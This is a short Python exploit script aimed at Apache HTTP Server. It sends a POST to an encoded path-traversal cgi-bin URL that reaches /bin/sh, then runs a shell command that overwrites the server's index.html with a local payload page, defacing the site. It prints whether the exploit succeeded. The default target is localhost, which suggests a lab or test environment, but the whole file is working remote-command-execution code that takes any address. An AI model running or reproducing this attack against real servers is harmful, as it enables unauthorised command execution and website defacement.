
import os
import urllib.request
import socket

def exploit(address):
  with open(os.path.join(os.path.dirname(__file__), "payload/index.html")) as f:
    sh_code = "echo \"%s\" >  /usr/local/apache2/htdocs/index.html" % f.read().replace("\n","")
  url = "http://"+address+"/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\n"
  payload = "echo; %s" % sh_code
  # print(payload)
  req = urllib.request.Request(url, data=payload.encode('utf-8'))

  try:
    res = urllib.request.urlopen(req)
    print(res.read().decode('utf-8'))
    if res.status == 200:
      print("exploit succeeded! access to %s" % address)
  except urllib.error.URLError:
    print('Server %s is not vulnerable' % address)
  except socket.timeout:
    print('Server %s does not response' % address)
  except ConnectionResetError:
    print('Server %s connection reset' % address)


if __name__ == "__main__":
  exploit("localhost:8080")